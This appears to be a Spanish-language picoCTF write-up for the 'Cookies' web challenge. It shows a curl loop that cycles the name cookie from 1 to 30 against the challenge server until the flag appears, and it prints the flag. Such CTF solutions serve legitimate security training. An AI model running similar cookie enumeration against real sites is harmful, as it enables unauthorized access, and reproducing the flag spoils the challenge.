## Descripción

*Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)*

## Pistas

*None*


## Solución

*Shell*
```
ceciSolis-picoctf@webshell:~$ for i in {1..30}; do curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=$i"; done | grep 'picoCTF{'
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
ceciSolis-picoctf@webshell:~$ 


```
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}

## Notas Adicionales 

*Tenemos varias cookies y en donde esta la bandera puede ser del 1 al 30, entonces, hacemos un ciclo for donde recorda del uno al treinta, donde el curl o sea el link sea silencioso con la -s y al encabezado de la cookie le cambie el valor con i del 1 al 30 eso va recorrer el ciclo, finalmente solo muestra donde empiece la bandera que empieza con picoCTF{., obtenemos la bandera*


## Referencias 

[http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)
http://mercury.picoctf.net:29649/check

